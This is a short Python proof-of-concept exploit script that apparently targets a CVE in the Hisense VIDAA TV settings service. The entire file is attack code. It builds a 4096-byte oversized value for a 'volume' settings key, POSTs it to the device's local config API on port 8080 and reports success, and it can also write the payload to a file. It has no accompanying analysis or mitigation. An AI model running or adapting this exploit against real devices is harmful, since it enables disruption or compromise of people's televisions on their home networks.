#!/usr/bin/env python3
"""CVE-2025-20879 — Hisense VIDAA Settings. Settings key with an oversized
value string pushed over the local config API."""
import sys, urllib.request

def build() -> bytes:
    return b"key=volume&value=" + b"9" * 4096 + b"&key=audio.out&value=arc"

def exploit(host, port=8080):
    url = f"http://{host}:{port}/settings/set"
    req = urllib.request.Request(url, data=build(), method="POST")
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            print(f"[+] CVE-2025-20879 -> {r.status}"); return True
    except Exception as e:
        print(f"[-] {e}"); return False

def main():
    if len(sys.argv) > 1: exploit(sys.argv[1])
    else:
        from pathlib import Path
        Path("cve-2025-20879.txt").write_bytes(build()); print("[+] payload written")

if __name__ == "__main__":
    main()
